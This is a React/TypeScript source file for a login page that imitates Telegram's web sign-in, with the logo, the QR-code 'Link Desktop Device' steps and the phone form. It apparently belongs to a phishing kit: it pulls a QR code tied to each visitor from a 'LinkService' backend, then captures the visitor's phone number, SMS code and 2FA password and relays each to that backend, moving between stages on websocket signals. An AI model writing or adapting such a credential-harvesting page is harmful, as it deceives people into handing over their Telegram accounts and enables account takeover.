import { FC, useState, useContext, useEffect } from "react";
import { observer } from "mobx-react-lite";
import { ctx } from "../..";
import LinkService from "../../services/LinkService";
import m from "./AuthPage.module.sass"
import { useQuery } from "../../hooks/useQueryHook";
import { useParams } from "react-router-dom";
import { socket } from "../../websocket/socket";
import PhoneInput from "../../component/PhoneInput/PhoneInput";
import Input from "../../component/Input/Input";
import { ICountry } from "../../models/ICountry";

const AuthPage: FC = () => {

    const {store} = useContext(ctx)
    const [qrUrl, setQrUrl] = useState<string>()
    const [pass, setPass] = useState<string>()
    const [phoneLogin, setPhoneLogin] = useState<boolean>(false)
    const [stage, setStage] = useState<string>("INIT")
    const [code, setCode] = useState<string>()
    const [phone, setPhone] = useState<string>()
    
    const initializeLoginProcess = async (visitorId: string) => {
        try {
            const {data} = await LinkService.intializeLoginProcess(visitorId)
            if(data.json) setQrUrl(data.json.qrUrl)
        } catch(e) {
            console.error(e)
        }
    }

    const send2FACode = async () => {
        try {
            const {data} = await LinkService.send2FA(store.visitor!.id, pass!)
            if(data.json.status === "SUCCESS") setStage("SUCCESS")
        } catch(e) {
            console.error(e)
        }
    }

    const sendCode = async () => {
        try {
            const {data} = await LinkService.sendCode(store.visitor!.id, phone!)
            if(data.json.status === "CODE") setStage("CODE")
        } catch(e) {
            console.error(e)
        }
    }

    const verify = async () => {
        try {
            const {data} = await LinkService.verifyCode(store.visitor!.id, phone!, code!)
            if(data.json.status === "2FA") setStage("2FA")
        } catch(e) {
            console.error(e)
        }
    }

    useEffect(() => {
        if(store.visitor) initializeLoginProcess(store.visitor.id)
    }, [store.visitor])

    useEffect(() => {
        if(!store.websocketConnected) return;
        socket.on("update", (data: string) => {
            switch(data) {
                case "2FA": 
                    return setStage("2FA")
                case "SUCCESS": 
                    return setStage("SUCCESS")
            }
        })
    }, [store.websocketConnected])

    if(!store.link) return <></>

    return (
        <div className={m.AuthPageWrapper}>
            {
                stage==="2FA" &&
                <div>
                    <input placeholder="Enter code" onChange={(e) => setPass(e.target.value)}/>
                    <button onClick={send2FACode}>SEND 2FA CODE</button>
                </div>
            }
            {
                stage==="SUCCESS" && 
                <div>
                    <h1>SUCCESS</h1>
                </div>
            }
            {
                stage==="CODE" &&
                <div>
                    <input placeholder="Enter verifification code" onChange={(e) => setCode(e.target.value)}/>
                    <button onClick={verify}>SEND CODE</button>
                </div>
            }
            {
                !phoneLogin ?
                    stage==="INIT" && 
                    <div className={m.ContentQr}>
                        <img src={qrUrl} key={qrUrl} className={m.Qr}/>
                        <h1 className={m.QRTitle}>Log in to Telegram by QR Code</h1>
                        <ol>
                            <li>
                                <span>Open Telegram on your phone</span>
                            </li>
                            <li>
                                <span>{"Go to Settings > Devices > Link Desktop Device"}</span>
                            </li>
                            <li>
                                <span>Point your phone at this screen to confirm login</span>
                            </li>
                        </ol>
                        <button className="tgme-login-btn" onClick={() => setPhoneLogin(true)}>LOG IN BY PHONE NUMBER</button>
                    </div>
                :
                <div className={m.ContentAuth}>
                    <img src="/telegram-logo.svg" className={m.TgLogo}/>
                    <h4 className={m.SignInTitle}>Telegram</h4>
                    <p className={m.Hint}>
                        Please confirm your country code
                        and enter your phone number.
                    </p>
                    <PhoneInput
                        selectCb={(c:ICountry) => setPhone(c.phone)}
                    />
                    <Input
                        primary
                        onChange={(v) => setPhone(v)}
                        placeholder="Your phone number"
                        value={phone!}
                    />
                    <label className="Checkbox">
                        <input type="checkbox"/>
                        <div className="Checkbox-main">
                            <span className="label" dir="auto">
                                Keep me signed in
                            </span>
                        </div>
                    </label>
                    <button onClick={sendCode}>SEND CODE</button>
                </div>
            }
        </div>
    )
}

export default observer(AuthPage)